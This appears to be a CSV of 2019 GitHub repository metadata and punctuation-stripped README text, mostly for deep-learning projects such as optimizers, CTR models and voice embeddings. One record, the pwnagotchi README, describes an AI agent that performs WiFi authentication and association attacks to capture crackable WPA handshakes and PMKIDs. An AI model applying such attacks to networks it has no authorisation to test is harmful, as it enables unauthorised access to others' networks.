believe that go global ambition requires international standard members Cinnamon will create the best environment for all members to grow toward that goal Grit Ability to stay extremely persistent toward the goal Weve grown from so little to a leading global business by making impossibles possible StretchYouself Actively learn and take new opportunity in the area of knowledge and experience that you dont have before Non tech members learn about AI development engineer learns about business aspect HR learns about Finance etc Leadership drivenTeamwork Proactively seek for mutual understanding in any collaboration actively resolve conflicts and do whatever needs to be done to make sure team company goals achieved even outside of scope of responsibility Cinnamon appreciates value of each members contribution What we will return Salary range is above the market Laptop provided GPU AWS all be ready for model training An open flexible and collaborative working environment Happy Monday Book Club English Club Company Trip Teambuilding acitivities with free snack and drink We mostly focus on talent development Knowledge sharing sessions from internal and external Experts 1 day off 3 days working online monthly Opening Vancacies Project Manager http bit ly Cin PM Updated Technical Achitect http bit ly Cinnamon Technical Architect Software Engineer http bit ly CinSEUpdated QA Tester Manual http bit ly CinQASystem Contact for Applications talent cinnamon is 0899 866 003,2019-09-27T04:10:45Z,2019-09-27T04:32:53Z,n/a,giangnguyen2710,User,1,1,0,1,master,giangnguyen2710,1,0,0,0,0,0,0
Prashant1806,SingleNeuronNeuralNetwork,n/a,SingleNeuronNeuralNetwork A single neuron neural network in Python Neural networks are the core of deep learning a field which has practical applications in many different areas Today neural networks are used for image classification speech recognition object detection etc Now Lets try to understand the basic unit behind all this state of art technique A single neuron transforms given input into some output Depending on the given input and weights assigned to each input decide whether the neuron fired or not Lets assume the neuron has 3 input connections and one output We will be using tanh activation function in given example The end goal is to find the optimal set of weights for this neuron which produces correct results Do this by training the neuron with several different training examples At each step calculate the error in the output of neuron and back propagate the gradients The step of calculating the output of neuron is called forward propagation while calculation of gradients is called back propagation,2019-10-22T14:43:10Z,2019-11-07T17:41:32Z,Python,Prashant1806,User,1,1,0,2,master,Prashant1806,1,0,0,0,0,0,0
evilsocket,pwnagotchi,ai#bettercap#deep-learning#deep-neural-network#deep-reinforcement-learning#handshakes#wpa-psk,Pwnagotchi Pwnagotchi https pwnagotchi ai is an A2C https hackernoon com intuitive rl intro to advantage actor critic a2c 4ff545978752 based AI leveraging bettercap https www bettercap org that learns from its surrounding WiFi environment to maximize the crackable WPA key material it captures either passively or by performing authentication and association attacks This material is collected as PCAP files containing any form of handshake supported by hashcat https hashcat net hashcat including PMKIDs https www evilsocket net 2019 02 13 Pwning WiFi networks with bettercap and the PMKID client less attack full and half WPA handshakes ui https i imgur com X68GXrn png Instead of merely playing Super Mario or Atari games https becominghuman ai getting mario back into the gym setting up super mario bros in openais gym 8e39a96c1e41 gi c4b66c3d5ced like most reinforcement learning based AI yawn Pwnagotchi tunes its parameters https github com evilsocket pwnagotchi blob master pwnagotchi defaults yml L73 over time to get better at pwning WiFi things to in the environments you expose it to More specifically Pwnagotchi is using an LSTM with MLP feature extractor https stable baselines readthedocs io en master modules policies html stablebaselines common policies MlpLstmPolicy as its policy network for the A2C agent https stable baselines readthedocs io en master modules a2c html If you re unfamiliar with A2C here is a very good introductory explanation https hackernoon com intuitive rl intro to advantage actor critic a2c 4ff545978752 in comic form of the basic principles behind how Pwnagotchi learns You can read more about how Pwnagotchi learns in the Usage https www pwnagotchi ai usage training the ai doc Keep in mind Unlike the usual RL simulations Pwnagotchi learns over time Time for a Pwnagotchi is measured in epochs a single epoch can last from a few seconds to minutes depending on how many access points and client stations are visible Do not expect your Pwnagotchi to perform amazingly well at the very beginning as it will be exploring https hackernoon com intuitive rl intro to advantage actor critic a2c 4ff545978752 several combinations of key parameters https www pwnagotchi ai usage training the ai to determine ideal adjustments for pwning the particular environment you are exposing it to during its beginning epochs but listen to your Pwnagotchi when it tells you it s boring Bring it into novel WiFi environments with you and have it observe new networks and capture new handshakesand you ll see Multiple units within close physical proximity can talk to each other advertising their presence to each other by broadcasting custom information elements using a parasite protocol I ve built on top of the existing dot11 standard Over time two or more units trained together will learn to cooperate upon detecting each other s presence by dividing the available channels among them for optimal pwnage Documentation https www pwnagotchi ai Links nbsp Official Links Website pwnagotchi ai https pwnagotchi ai Forum community pwnagotchi ai https community pwnagotchi ai Slack pwnagotchi slack com https invite pwnagotchi ai Subreddit r pwnagotchi https www reddit com r pwnagotchi Twitter pwnagotchi https twitter com pwnagotchi License pwnagotchi is made with by evilsocket https twitter com evilsocket and the amazing dev team https github com evilsocket pwnagotchi graphs contributors It is released under the GPL3 license,2019-09-19T13:07:15Z,2019-12-14T23:12:08Z,JavaScript,evilsocket,User,120,2957,363,1403,master,evilsocket#dadav#caquino#hexwaxwing#justin-p#deveth0#jsoref#hmax42#xenDE#dipsylala#zenzen666#Leajian#opteeks#benleb#ratmandu#sp3nx0r#cdiemel#massar#daswisher#neutralinsomniac#georgikoemdzhiev#python273#Arttumiro#SpiderDead#Xstoudi#Velik123#Evg33#mil1200#gh0stshell#alanyee#dsopas#mbgroot#g0blinResearch#nikhiljha#quantumsheep#SecurityWaffle#swedishmike#alwayslivid#Nels885#JRWR#sindelar-fr#incredincomp#friedphish#LaurentFough#qbit#ciara1234#adolfaka#FrixosTh#leon-th#PhyberApex#darumaseye#diegopastor#dwi#gkrs#nicesocket#strasharo#emedvedev#budd3993#charlesrocket#5h4d0wb0y#drego85#andrewbeard#andr3w-hilton#ChipWolf#Spindel#danielhoherd#chillinPanda#edmael#uzerai#soebbing#LorenzCK#maxxer#LuckyFishGeek#luclu7#pholecule#michelep#pcotret#ronangaillard#simpsora#sayak-brm#szymex73#wystans#bensmith83#bitwave#colossus700#damoklov#daniel156161#DaniloNC#dependabot[bot]#gpotter2#hisakiyo#jakubmilkowski#kovachwt#lexusburn#spees#wytshadow,96,15,15,86,263,12,385
graykode,distribution-is-all-you-need,deep-learning#distribution#gaussian#mathmatics#probability,distribution is all you need distribution is all you need is the basic distribution probability tutorial for most common distribution focused on Deep learning using python library Overview of distribution probability overview png conjugate means it has relationship of conjugate distributions In Bayesian probability https en wikipedia org wiki Bayesianprobability theory if the posterior distributions https en wikipedia org wiki Posteriorprobability p x are in the same probability distribution family https en wikipedia org wiki Listofprobabilitydistributions as the prior probability distribution https en wikipedia org wiki Priorprobabilitydistribution p the prior and posterior are then called conjugate distributions and the prior is called a conjugate prior for the likelihood function https en wikipedia org wiki Likelihoodfunction Conjugate prior wikipedia https en wikipedia org wiki Conjugateprior Multi Class means that Random Varivance are more than 2 N Times means that we also consider prior probability P X To learn more about probability I recommend reading pattern recognition and machine learning Bishop 2006 distribution probabilities and features 1 Uniform distribution continuous code uniform py Uniform distribution has same probaility value on a b easy probability 2 Bernoulli distribution discrete code bernoulli py Bernoulli distribution is not considered about prior probability P X Therefore if we optimize to the maximum likelihood we will be vulnerable to overfitting We use binary cross entropy to classify binary classification It has same form like taking a negative log of the bernoulli distribution 3 Binomial distribution discrete code binomial py Binomial distribution with parameters n and p is the discrete probability distribution of the number of successes in a sequence of n independent experiments Binomial distribution is distribution considered prior probaility by specifying the number to be picked in advance 4 Multi Bernoulli distribution Categorical distribution discrete code categorical py Multi bernoulli called categorical distribution is a probability expanded more than 2 cross entopy has same form like taking a negative log of the Multi Bernoulli distribution 5 Multinomial distribution discrete code multinomial py The multinomial distribution has the same relationship with the categorical distribution as the relationship between Bernoull and Binomial 6 Beta distribution continuous code beta py Beta distribution is conjugate to the binomial and Bernoulli distributions Using conjucation we can get the posterior distribution more easily using the prior distribution we know Uniform distiribution is same when beta distribution met special case alpha 1 beta 1 7 Dirichlet distribution continuous code dirichlet py Dirichlet distribution is conjugate to the MultiNomial distributions If k 2 it will be Beta distribution 8 Gamma distribution continuous code gamma py Gamma distribution will be beta distribution if Gamma a 1 Gamma a 1 Gamma b 1 is same with Beta a b The exponential distribution and chi squared distribution are special cases of the gamma distribution 9 Exponential distribution continuous code exponential py Exponential distribution is special cases of the gamma distribution when alpha is 1 10 Gaussian distribution continuous code gaussian py Gaussian distribution is a very common continuous probability distribution 11 Normal distribution continuous code normal py Normal distribution is standarzed Gaussian distribution it has 0 mean and 1 std 12 Chi squared distribution continuous code chi squared py Chi square distribution with k degrees of freedom is the distribution of a sum of the squares of k independent standard normal random variables Chi square distribution is special case of Beta distribution 13 Student t distribution continuous code student t py The t distribution is symmetric and bell shaped like the normal distribution but has heavier tails meaning that it is more prone to producing values that fall far from its mean Author If you would like to see the details about relationship of distribution probability please refer to this https en wikipedia org wiki Relationshipsamongprobabilitydistributions https upload wikimedia org wikipedia commons thumb 6 69 Relationshipsamongsomeofunivariateprobabilitydistributions jpg 2880px Relationshipsamongsomeofunivariateprobabilitydistributions jpg Tae Hwan Jung graykode https github com graykode Kyung Hee Univ CE Undergraduate Author Email nlkey2022 gmail com mailto nlkey2022 gmail com If you leave the source you can use it freely,2019-09-06T04:35:53Z,2019-12-14T06:26:27Z,Python,graykode,User,26,674,166,7,master,graykode,1,0,0,2,0,0,0
lessw2020,Ranger-Deep-Learning-Optimizer,n/a,Ranger Deep Learning Optimizer Ranger a synergistic optimizer combining RAdam Rectified Adam and LookAhead in one codebase Latest version 9 3 19 full refactoring for slow weights and one pass handling vs two before Refactor should eliminate any random save load issues regarding memory Beta Version Ranger913A py For anyone who wants to try this out early this version changes from RAdam to using calibrated anistropic adaptive learning rate per this paper https arxiv org abs 1908 00700v2 Empirical studies support our observation of the anisotropic A LR and show that the proposed methods outperform existing AGMs and generalize even better than S Momentum in multiple deep learning tasks Initial testing looks very good for training stabilization Any feedback in comparsion with current Ranger 9 3 19 is welcome Medium article with more info https medium com lessw new deep learning optimizer ranger synergistic combination of radam lookahead for the best of 2dc83f79a48d Multiple updates 1 Ranger is the optimizer we used to beat the high scores for 12 different categories on the FastAI leaderboards Previous records all held with AdamW optimizer 2 Highly recommend combining Ranger with Mish activation function and flat cosine anneal training curve 3 Based on that also found 95 is better than 90 for beta1 momentum param ala betas 0 95 0 999 Fixes 1 Differential Group learning rates now supported This was fix in RAdam and ported here thanks to sholderbach 2 save and then load may leave first run weights stranded in memory slowing down future runs fixed Installation Clone the repo cd into it and install it in editable mode e option That way these is no more need to re install the package after modification bash git clone https github com lessw2020 Ranger Deep Learning Optimizer cd Ranger Deep Learning Optimizer pip install e Usage python from ranger import Ranger this is from ranger py from ranger import RangerVA this is from ranger913A py from ranger import RangerQH this is from rangerqh py Define your model model Each of the Ranger RangerVA RangerQH have different parameters optimizer Ranger model parameters kwargs Usage and notebook to test are available here https github com lessw2020 Ranger Mish ImageWoof 5,2019-08-19T05:15:37Z,2019-12-14T06:51:33Z,Python,lessw2020,User,23,434,62,27,master,lessw2020#mpariente#fparodimoraes#sholderbach,4,0,0,7,12,0,3
resemble-ai,Resemblyzer,n/a,Resemblyzer allows you to derive a high level representation of a voice through a deep learning model referred to as the voice encoder Given an audio file of speech it creates a summary vector of 256 values an embedding often shortened to embed in this repo that summarizes the characteristics of the voice spoken N B this repo holds 100mb of audio data for demonstration purpose To get the package https pypi org project Resemblyzer alone run pip install resemblyzer python 3 5 is required Demos Speaker diarization Demo 02 https github com resemble ai Resemblyzer blob master demo02diarization py recognize who is talking when with only a few seconds of reference audio per speaker click the image for a video demo02 https i imgur com 2MpNauG png https streamable com uef39 Fake speech detection Demo 05 https github com resemble ai Resemblyzer blob master demo05fakespeechdetection py modest detection of fake speech by comparing the similarity of 12 unknown utterances 6 real ones 6 fakes against ground truth reference audio Scores above the dashed line are predicted as real so the model makes one error here demo05 plots fakespeechdetection png raw true For reference this https www youtube com watch v Ho9h0ouemWQ is the fake video that achieved a high score Visualizing the manifold Demo 03 left https github com resemble ai Resemblyzer blob master demo03projection py projecting the embeddings of 100 utterances 10 each from 10 speakers in 2D space The utterances from the same speakers form a tight cluster With a trivial clustering algorithm the speaker verification error rate for this example with data unseen in training would be 0 Demo 04 right https github com resemble ai Resemblyzer blob master demo04clustering py same as demo 03 but with 251 embeddings all from distinct speakers highlighting that the model has learned on its own to identify the sex of the speaker demo0304 plots allclustering png raw true Cross similarity Demo 01 https github com resemble ai Resemblyzer blob master demo01similarity py comparing 10 utterances from 10 speakers against 10 other utterances from the same speakers demo01 plots simmatrix1 png raw true What can I do with this package Resemblyzer has many uses Voice similarity metric compare different voices and get a value on how similar they sound This leads to other applications Speaker verification create a voice profile for a person from a few seconds of speech 5s 30s and compare it to that of new audio Reject similarity scores below a threshold Speaker diarization figure out who is talking when by comparing voice profiles with the continuous embedding of a multispeaker speech segment Fake speech detection verify if some speech is legitimate or fake by comparing the similarity of possible fake speech to real speech High level feature extraction you can use the embeddings generated as feature vectors for machine learning or data analysis This also leads to other applications Voice cloning see this other project https github com CorentinJ Real Time Voice Cloning Component analysis figure out accents tones prosody gender through a component analysis of the embeddings Virtual voices create entirely new voice embeddings by sampling from a prior distribution Loss function you can backpropagate through the voice encoder model and use it as a perceptual loss for your deep learning model The voice encoder is written in PyTorch Resemblyzer is fast to execute around 1000x real time on a GTX 1080 with a minimum of 10ms for I O operations and can run both on CPU or GPU It is robust to noise It currently works best on English language only but should still be able to perform somewhat decently on other languages Code example This is a short example showing how to use Resemblyzer from resemblyzer import VoiceEncoder preprocesswav from pathlib import Path import numpy as np fpath Path pathtoanaudiofile wav preprocesswav fpath encoder VoiceEncoder embed encoder embedutterance wav np setprintoptions precision 3 suppress True print embed I highly suggest giving a peek to the demos to understand how similarity is computed and to see practical usages of the voice encoder Additional info Resemblyzer emerged as a side project of the Real Time Voice Cloning https github com CorentinJ Real Time Voice Cloning repository The pretrained model that comes with Resemblyzer is interchangeable with models trained in that repository so feel free to finetune a model on new data and possibly new languages The paper from which the voice encoder was implemented is Generalized End To End Loss for Speaker Verification https arxiv org pdf 1710 10467 pdf in which it is called the speaker encoder,2019-08-15T16:39:51Z,2019-12-14T13:02:30Z,Python,resemble-ai,Organization,22,389,55,41,master,CorentinJ#ZohaibAhmed,2,1,1,1,15,0,2
vaibhawvipul,First-steps-towards-Deep-Learning,artificial-intelligence#artificial-neural-networks#computer-vision#convolutional-neural-networks#deep-learning#deep-learning-tutorial#deep-neural-networks#how-to#python3#pytorch#pytorch-implementation#pytorch-tutorial#recurrent-neural-networks,First steps towards Deep Learning with PyTorch Initiative by Vipul Vaibhaw This is an open sourced book on deep learning This book is supposed to be mathematically light and caters to the readers who have no experience with deep learning or a strong mathematics background This book is meant to help readers take their First Step towards Deep Learning alt text https github com vaibhawvipul First steps towards Deep Learning blob master images First 20steps 20towards 20deep 20learning 20with 20pytorch 20cover png Book Cover NOTE I am still writing the book this is the first draft Contents x Chapter 1 Understanding Artificial Neural Networks x Chapter 2 Introduction to pyTorch x Chapter 3 How to make a computer see Chapter 4 How to make a computer remember stuff x Chapter 5 Where to go from here How can you contribute You can contribute by creating better image assests You can add better explanations to the topics You can add working google colab notebooks You can add more pytorch examples for beginners Feel free to raise PR and contribute Check out reddit post https www reddit com r learnmachinelearning comments d85isn iopensourcedmybook,2019-09-11T07:26:33Z,2019-12-12T10:28:01Z,CSS,vaibhawvipul,User,27,352,63,35,master,vaibhawvipul#sanjaydogood#BrendanMartin#andresC98#drigio,5,0,0,4,2,1,4
shenweichen,DeepCTR-Torch,ctr-models#deep-learning#deepctr#deepctr-pytorch#deepfm#fibinet#xdeepfm,DeepCTR Torch Python Versions https img shields io pypi pyversions deepctr torch svg https pypi org project deepctr torch Downloads https pepy tech badge deepctr torch https pepy tech project deepctr torch PyPI Version https img shields io pypi v deepctr torch svg https pypi org project deepctr torch GitHub Issues https img shields io github issues shenweichen deepctr torch svg https github com shenweichen deepctr torch issues Documentation Status https readthedocs org projects deepctr torch badge version latest https deepctr torch readthedocs io CI status https github com shenweichen deepctr torch workflows CI badge svg codecov https codecov io gh shenweichen DeepCTR Torch branch master graph badge svg https codecov io gh shenweichen DeepCTR Torch Disscussion https img shields io badge chat wechat brightgreen style flat README md disscussiongroup License https img shields io github license shenweichen deepctr torch svg https github com shenweichen deepctr torch blob master LICENSE PyTorch version of DeepCTR https github com shenweichen DeepCTR DeepCTR is a Easy to use Modular and Extendible package of deep learning based CTR models along with lots of core components layers which can be used to build your own custom model easily You can use any complex model with model fit and model predict Install through pip install U deepctr torch Let s Get Started https deepctr torch readthedocs io en latest Quick Start html Chinese Introduction https zhuanlan zhihu com p 53231955 Contributors welcome to join us CONTRIBUTING md Models List Model Paper Convolutional Click Prediction Model CIKM 2015 A Convolutional Click Prediction Model http ir ia ac cn bitstream 173211 12337 1 A 20Convolutional 20Click 20Prediction 20Model pdf Factorization supported Neural Network ECIR 2016 Deep Learning over Multi field Categorical Data A Case Study on User Response Prediction https arxiv org pdf 1601 02376 pdf Product based Neural Network ICDM 2016 Product based neural networks for user response prediction https arxiv org pdf 1611 00144 pdf Wide Deep DLRS 2016 Wide Deep Learning for Recommender Systems https arxiv org pdf 1606 07792 pdf DeepFM IJCAI 2017 DeepFM A Factorization Machine based Neural Network for CTR Prediction http www ijcai org proceedings 2017 0239 pdf Piece wise Linear Model arxiv 2017 Learning Piece wise Linear Models from Large Scale Data for Ad Click Prediction https arxiv org abs 1704 05194 Deep Cross Network ADKDD 2017 Deep Cross Network for Ad Click Predictions https arxiv org abs 1708 05123 Attentional Factorization Machine IJCAI 2017 Attentional Factorization Machines Learning the Weight of Feature Interactions via Attention Networks http www ijcai org proceedings 2017 435 Neural Factorization Machine SIGIR 2017 Neural Factorization Machines for Sparse Predictive Analytics https arxiv org pdf 1708 05027 pdf xDeepFM KDD 2018 xDeepFM Combining Explicit and Implicit Feature Interactions for Recommender Systems https arxiv org pdf 1803 05170 pdf AutoInt arxiv 2018 AutoInt Automatic Feature Interaction Learning via Self Attentive Neural Networks https arxiv org abs 1810 11921 ONN arxiv 2019 Operation aware Neural Networks for User Response Prediction https arxiv org pdf 1904 12579 pdf FiBiNET RecSys 2019 FiBiNET Combining Feature Importance and Bilinear feature Interaction for Click Through Rate Prediction https arxiv org pdf 1905 09433 pdf DisscussionGroup Pleasefollowourwechattojoingroup wechat ID deepctrbot wechat docs pics weichennote png,2019-09-06T13:00:06Z,2019-12-13T06:24:18Z,Python,shenweichen,User,24,323,63,47,master,shenweichen#wutongzhang#Zengai#JyiHUO#chenkkkk#uestc7d#tangaqi,7,3,3,15,5,3,51
Thinklab-SJTU,PCA-GM,n/a,PCA GM This repository contains PyTorch implementation of our ICCV 2019 paper for oral presentation Learning Combinatorial Embedding Networks for Deep Graph Matching http openaccess thecvf com contentICCV2019 papers WangLearningCombinatorialEmbeddingNetworksforDeepGraphMatchingICCV2019paper pdf It contains our implementation of following deep graph matching methods GMN Andrei Zanfir and Cristian Sminchisescu Deep Learning of Graph Matching CVPR 2018 PCA GM Runzhong Wang Junchi Yan and Xiaokang Yang Learning Combinatorial Embedding Networks for Deep Graph Matching ICCV 2019 This repository also include training evaluation protocol on Pascal VOC Keypoint and Willow Object Class dataset inline with the experiment part in our ICCV 2019 paper Get started 1 Install and configure pytorch 1 1 with GPU support 1 Install ninja build apt get install ninja build 1 Install python packages pip install tensorboardX scipy easydict pyyaml 1 If you want to run experiment on Pascal VOC Keypoint dataset 1 Download VOC2011 dataset http host robots ox ac uk pascal VOC voc2011 index html and make sure it looks like data PascalVOC VOC2011 1 Download keypoint annotation for VOC2011 from Berkeley server https www2 eecs berkeley edu Research Projects CS vision shape poselets voc2011keypointsFeb2012 tgz or google drive https drive google com open id 1D5o8rmnY1 DaDrgAXSygnflX5c JyUWR and make sure it looks like data PascalVOC annotations 1 The train test split is available in data PascalVOC voc2011pairs npz 1 If you want to run experiment on Willow ObjectClass dataset please refer to this section detailed instructions on willow object class dataset Training Run training and evaluation python traineval py cfg path to your yaml and replace path to your yaml by path to your configuration file Default configuration files are stored in experiments Evaluation Run evaluation on epoch k python eval py cfg path to your yaml epoch k Detailed instructions on Willow Object Class dataset 1 Download Willow ObjectClass dataset http www di ens fr willow research graphlearning WILLOW ObjectClassdataset zip 1 Unzip the dataset and make sure it looks like data WILLOW ObjectClass 1 If you want to initialize model weights on Pascal VOC Keypoint dataset as reported in the paper please 1 Remove cached VOC index rm data cache vocdb 1 Uncomment L156 159 in data pascalvoc py to filter out overlapping images in Pascal VOC 1 Train model on Pascal VOC Keypoint dataset e g python traineval py cfg experiments vgg16pcavoc yaml 1 Copy Pascal VOC s cached weight to the corresponding directory of Willow E g copy Pascal VOC s model weight at epoch 10 for willow bash cp output vgg16pcavoc params 0010 pt output vgg16pcawillow params 1 Set the STARTEPOCH parameter to load the pretrained weights e g in experiments vgg16pcawillow yaml set yaml TRAIN STARTEPOCH 10 Benchmark We report performance on Pascal VOC Keypoint and Willow Object Class datasets These are consistent with the numbers reported in our paper Pascal VOC Keypoint mean accuracy is on the last column method aero bike bird boat bottle bus car cat chair cow table dog horse mbike person plant sheep sofa train tv mean GMN 31 9 47 2 51 9 40 8 68 7 72 2 53 6 52 8 34 6 48 6 72 3 47 7 54 8 51 0 38 6 75 1 49 5 45 0 83 0 86 3 55 3 PCA GM 40 9 55 0 65 8 47 9 76 9 77 9 63 5 67 4 33 7 65 5 63 6 61 3 68 9 62 8 44 9 77 5 67 4 57 5 86 7 90 9 63 8 Willow Object Class method face m bike car duck w bottle HARG SSVM 91 2 44 4 58 4 55 2 66 6 GMN VOC 98 1 65 0 72 9 74 3 70 5 GMN Willow 99 3 71 4 74 3 82 8 76 7 PCA GM VOC 100 0 69 8 78 6 82 4 95 1 PCA GM Willow 100 0 76 7 84 0 93 5 96 9 Suffix VOC means model trained on VOC dataset and suffix Willow means model tuned on Willow dataset Citation If you find this repository helpful to your research please consider citing text InProceedingsWang2019ICCV author Wang Runzhong and Yan Junchi and Yang Xiaokang title Learning Combinatorial Embedding Networks for Deep Graph Matching booktitle The IEEE International Conference on Computer Vision ICCV month October year 2019,2019-09-06T17:07:08Z,2019-12-13T07:29:01Z,Python,Thinklab-SJTU,Organization,9,303,37,9,master,rogerwwww,1,0,0,1,9,0,0
d2l-ai,d2l-tvm,n/a,Dive into Deep Learning Compiler Website with CDN https tvm d2l ai Website without CDN any change will display immediately http tvm d2l ai s3 website us west 2 amazonaws com How to contribute Roadmap https docs google com document d 14Bgo9TgczROlqcTinS5 Y4hyig ae0Rm8uIFQl9OAEA edit usp sharing Use Jupyter to edit the markdown files http d2l ai chapterappendixtools jupyter html markdown files in jupyter How to send a PR on Github http d2l ai chapterappendixtools how to contribute html Style guideline https github com d2l ai d2l en blob master STYLEGUIDE md,2019-08-12T18:31:39Z,2019-12-14T06:57:30Z,Python,d2l-ai,Organization,24,190,24,176,master,mli#yidawang#cloudhan#xf05888,4,1,1,2,0,1,11
Qwicen,node,n/a,Neural Oblivious Decision Ensembles A supplementary code for Neural Oblivious Decision Ensembles for Deep Learning on Tabular Data https arxiv org abs 1909 06312 paper What does it do It learns deep ensembles of oblivious differentiable decision trees on tabular data What do i need to run it A machine with some CPU preferably 2 free cores and GPU s Running without GPU is possible but takes 8 10x as long even on high end CPUs Our implementation is memory inefficient and may require a lot of GPU memory to converge Some popular Linux x64 distribution Tested on Ubuntu16 04 should work fine on any popular linux64 and even MacOS Windows and x32 systems may require heavy wizardry to run When in doubt use Docker preferably GPU enabled i e nvidia docker How do I run it 1 Clone or download this repo cd yourself to it s root directory 2 Grab or build a working python enviromnent Anaconda https www anaconda com works fine 3 Install packages from requirements txt It is critical that you use torch 1 1 not 1 0 or earlier You will also need jupyter or some other way to work with ipynb files 4 Run jupyter notebook and open a notebook in notebooks Before you run the first cell change env CUDAVISIBLEDEVICES to an index that you plan to use The notebook downloads data from dropbox You will need 1 5Gb of disk space depending on dataset We showcase two typical learning scenarios for classification and regression Please consult the original paper for training details,2019-08-29T11:26:43Z,2019-12-14T17:03:45Z,Jupyter Notebook,Qwicen,User,10,177,13,5,master,Qwicen#jq,2,0,0,0,0,0,1
RTIInternational,gobbli,n/a,This is a library designed to provide a uniform interface to various deep learning models for text via programmatically created Docker containers Usage See the docs https gobbli readthedocs io en latest for prerequisites a quickstart and the API reference In brief you need Docker https www docker com installed with appropriate permissions for your user account to run Docker commands and Python 3 7 Then run the following pip install gobbli You may also want to check out the benchmarks benchmark to see some comparisons of gobbli s implementation of various models in different situations Development Assuming you have all prerequisites noted above you need to install the package and all required optional dependencies in development mode pip install e augment tokenize Install additional dev dependencies pip install r requirements txt Run linting autoformatting and tests runci sh To avoid manually fixing some of these errors consider enabling isort https github com timothycrosley isort and black https github com python black support in your favorite editor If you re running tests in an environment with less than 12GB of memory you ll want to pass the low resource argument when running tests to avoid out of memory errors NOTE If running on a Mac even with adequate memory available you may encounter Out of Memory errors exit status 137 when running the tests This is due to not enough memory being allocated to your Docker daemon Try going to Docker for Mac Preferences Advanced and raising Memory to 12GiB or more If you want to run the tests GPU s enabled see the use gpu and nvidia visible devices arguments under py test help If your local machine doesn t have an NVIDIA GPU but you have access to one that does via SSH you can use the testremotegpu sh script to run the tests with GPU enabled over SSH Docs To generate the docs install the docs requirements pip install r docs requirements txt Since doc structure is auto generated from the library you must have the library and all its dependencies installed as well Then run the following from the repository root generatedocs sh Then browse the generated documentation in docs build html Attribution gobbli wouldn t exist without the public release of several state of the art models The library incorporates BERT https github com google research bert released by Google MT DNN https github com namisan mt dnn released by Microsoft Universal Sentence Encoder https tfhub dev google universal sentence encoder 2 released by Google fastText https github com facebookresearch fastText released by Facebook pytorchtransformers https github com huggingface pytorch transformers released by Hugging Face Original work on the library was funded by RTI International https www rti org Logo design by Marcia Underwood http marciaunderwood com,2019-08-09T15:55:38Z,2019-12-13T02:57:13Z,Jupyter Notebook,RTIInternational,Organization,22,176,18,43,master,jasonnance#pmbaumgartner,2,6,6,6,4,0,2
M4cs,EasyModels,ai#api-client#models-library#tensorflow#training,EasyModels Easily find and view pre trained AI models through the command line Command Line GUI What EasyModels does EasyModels is an easy way to find and view deep learning projects and pre trained models It uses the modelzoo co API sorry ModelZoo but you didn t do a great job of hiding it so I hope you don t mind It will allow you to find different projects based on categories they re posted with on ModelZoo I d like to add more APIs to this project so if you know any other ones that might work well please make a PR or open an Issue thread with it as a suggestion I wrote this is literally 45 minutes and pushed out and since then there have been little one line fixes and features added here and there If you find any bugs please open an Issue thread on this repo Categories Computer Vision Natual Language Recognition Audio and Speech Generative Models Reinforcement Learning Unsupervised Learning License I Max Bridgland hereby allow all human beings to use this project and distribute it inside their own projects with due credit Due credit being my name and this repo s URL posted somewhere that ALL users will see by default Enjoy P Copyright 2019 Max Bridgland How it works Simply install from pip pip install easymodels easymodels or clone this repo and run python setup py install easymodels easymodels disable update disable checking for newest version for gui run easymodels gui This will bring up a command line tool that will guide you through grabbing whatever models are available through the modelzoo API,2019-08-14T05:03:47Z,2019-12-02T18:04:35Z,Python,M4cs,User,5,162,10,49,master,frenchie0x4ff#M4cs,2,6,7,0,1,0,2
xbresson,CE7454_2019,n/a,CE74542019 Deep learning course CE7454 2019 Cloud Machine 1 Google Colab Free GPU Follow this Notebook installation https colab research google com github xbresson CE74542019 blob master codes installation installation ipynb Open your Google Drive https www google com drive Open in Google Drive Folder CE74542019 and go to Folder CE74542019 codes Select the notebook file ipynb and open it with Google Colab using Control Click Open With Colaboratory Cloud Machine 2 Binder No GPU Simply click here Click here https mybinder org v2 gh xbresson CE74542019 master Local Installation Follow these instructions easy steps sh Conda installation curl o miniconda sh O https repo continuum io miniconda Miniconda3 latest Linux x8664 sh Linux curl o miniconda sh O https repo continuum io miniconda Miniconda3 latest MacOSX x8664 sh OSX chmod x miniconda sh miniconda sh source bashrc install https repo anaconda com miniconda Miniconda3 latest Windows x8664 exe Windows Clone GitHub repo git clone https github com xbresson CE74542019 git cd CE74542019 Install python libraries conda env create f environment yml source activate deeplearncourse Run the notebooks jupyter notebook,2019-08-15T01:30:39Z,2019-12-04T12:50:28Z,Jupyter Notebook,xbresson,User,10,159,56,16,master,xbresson,1,0,0,0,0,0,0
szymonmaszke,torchfunc,docker#extensions#functions#neural-network#performance#performance-analysis#pytorch#record#recording#tips#utilities#utils,torchfunc Logo https github com szymonmaszke torchfunc blob master assets banner png Version Docs Tests Coverage Style PyPI Python PyTorch Docker Roadmap Version https img shields io static v1 label message 0 1 1 color 377EF0 style for the badge https github com szymonmaszke torchfunc releases Documentation https img shields io static v1 label message docs color EE4C2C style for the badge https szymonmaszke github io torchfunc Tests https github com szymonmaszke torchfunc workflows test badge svg Coverage https img shields io codecov c github szymonmaszke torchfunc label 20 logo codecov style for the badge codebeat https img shields io static v1 label message CB color 27A8E0 style for the badge https codebeat co projects github com szymonmaszke torchfunc master PyPI https img shields io static v1 label message PyPI color 377EF0 style for the badge https pypi org project torchfunc Python https img shields io static v1 label message 3 7 color 377EF0 style for the badge logo python logoColor F8C63D https www python org PyTorch https img shields io static v1 label message 1 2 0 color EE4C2C style for the badge https pytorch org Docker https img shields io static v1 label message docker color 309cef style for the badge https cloud docker com u szymonmaszke repository docker szymonmaszke torchfunc Roadmap https img shields io static v1 label message roadmap color 009688 style for the badge https github com szymonmaszke torchfunc blob master ROADMAP md torchfunc https szymonmaszke github io torchfunc is library revolving around PyTorch https pytorch org with a goal to help you with Improving and analysing performance of your neural network e g Tensor Cores compatibility Record analyse internal state of torch nn Module as data passes through it Do the above based on external conditions using single Callable to specify it Day to day neural network related duties model size seeding performance measurements etc Get information about your host operating system CUDA devices and others bulb Examples Get instant performance tips about your module All problems described by comments will be shown by torchfunc performance tips python class Model torch nn Module def init self super init self convolution torch nn Sequential torch nn Conv2d 1 32 3 torch nn ReLU inplace True Inplace may harm kernel fusion torch nn Conv2d 32 128 3 groups 32 Depthwise is slower in PyTorch torch nn ReLU inplace True Same as before torch nn Conv2d 128 250 3 Wrong output size for TensorCores self classifier torch nn Sequential torch nn Linear 250 64 Wrong input size for TensorCores torch nn ReLU Fine no info about this layer torch nn Linear 64 10 Wrong output size for TensorCores def forward self inputs convolved torch nn AdaptiveAvgPool2d 1 self convolution inputs flatten return self classifier convolved All you have to do print torchfunc performance tips Model Seed globaly including numpy and cuda freeze weights check inference time 